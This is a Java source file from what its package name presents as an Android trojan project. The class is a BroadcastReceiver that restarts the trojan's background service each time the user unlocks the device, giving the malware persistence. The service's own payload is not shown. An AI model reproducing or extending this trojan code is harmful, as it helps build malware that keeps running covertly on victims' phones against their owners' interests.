package trojan.android.android_trojan.Action.BroadcastReceiver;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import trojan.android.android_trojan.Action.Service.BackgroundService;
import trojan.android.android_trojan.Action.Tools;


public class BackgroundStartReceiver extends BroadcastReceiver {
    private static final String TAG = BackgroundStartReceiver.class.getSimpleName();

    public void onReceive(Context context, Intent intent)
    {
        if (!Tools.isMyServiceRunning(BackgroundService.class, context)
                && intent.getAction().equals(Intent.ACTION_USER_PRESENT)){
            context.startService(new Intent(context, BackgroundService.class));
            Log.d(TAG, "Service not launch");
        }else if (Tools.isMyServiceRunning(BackgroundService.class, context)
                && intent.getAction().equals(Intent.ACTION_USER_PRESENT)){
            Log.d(TAG, "Service already launch");
        }
    }
}
